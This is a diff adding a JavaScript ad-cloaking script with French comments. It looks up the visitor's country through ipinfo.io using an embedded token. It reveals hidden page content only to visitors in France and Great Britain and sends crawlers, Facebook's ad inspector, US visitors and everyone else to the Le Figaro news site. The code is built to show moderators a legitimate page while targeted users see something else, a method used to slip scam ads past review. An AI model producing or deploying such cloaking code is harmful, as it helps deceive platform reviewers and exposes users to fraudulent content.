@@ -1,0 +1,28 @@
+function isMobileDevice() {
+    return (typeof window.orientation !== "undefined") || (navigator.userAgent.indexOf('IEMobile') !== -1);
+}
+
+function isFromFacebookAd() {
+    const urlParams = new URLSearchParams(window.location.search);
+    return urlParams.has('fbclid');
+}
+
+function isBot(userAgent) {
+    // Liste des agents utilisateurs connus pour être des bots
+    const knownBots = ['googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 'yandex', 'sogou', 'exabot', 'facebookexternalhit'];
+    return knownBots.some(bot => userAgent.includes(bot));
+}
+
+fetch('https://ipinfo.io/json?token=0784c654f65d07')
+    .then(response => response.json())
+    .then(data => {
+        const userAgent = navigator.userAgent.toLowerCase();
+        const isBotUser = isBot(userAgent);
+        const country = data.country;
+
+        if (country === 'FR' || country === 'GB') { 
+            document.getElementById('blue-page').style.display = "none"; 
+        } else if (isBotUser || country === 'US' || (country !== 'FR' && country !== 'GB')) {
+            window.location.replace("https://www.lefigaro.fr/");
+        }
+    });
